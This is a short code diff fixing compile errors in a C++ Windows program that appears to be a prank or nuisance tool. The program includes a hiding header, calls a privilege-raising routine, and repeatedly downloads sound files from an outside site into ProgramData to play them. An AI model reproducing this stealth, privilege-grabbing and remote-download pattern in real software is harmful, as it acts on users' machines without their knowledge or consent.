@@ -10,9 +10,10 @@ By wurenji,2022
 #include"func.h"
 #include"hide.h"
 
-int _tmain(int argc, _TCHAR* argv[])
+//int _tmain(int argc, _TCHAR* argv[])
+int main(int argc,char *argv[])
 {
-	__time64_t *now;
+	__time64_t *now=NULL;
 	std::wstringstream wss;
 	GetPrivileges();
 	while (true)
@@ -42,7 +43,7 @@ int _tmain(int argc, _TCHAR* argv[])
 				wss << rand() % 5 << std::flush;
 				wss >> soundid;
 				DownloadFile(_T("https://llv-website.rf.gd/res/sound") + soundid + _T(".wav"), _T("%ProgramData%\\llv\\cache\\sound" )+ soundid + _T(".wav"));
-				PlaySoundFile(_T("%ProgramData%\\llv\\cache\\sound" + soundid + _T(".wav"),true);
+				PlaySoundFile(_T("%ProgramData%\\llv\\cache\\sound" )+ soundid + _T(".wav"),true);
 
 			}
 		}
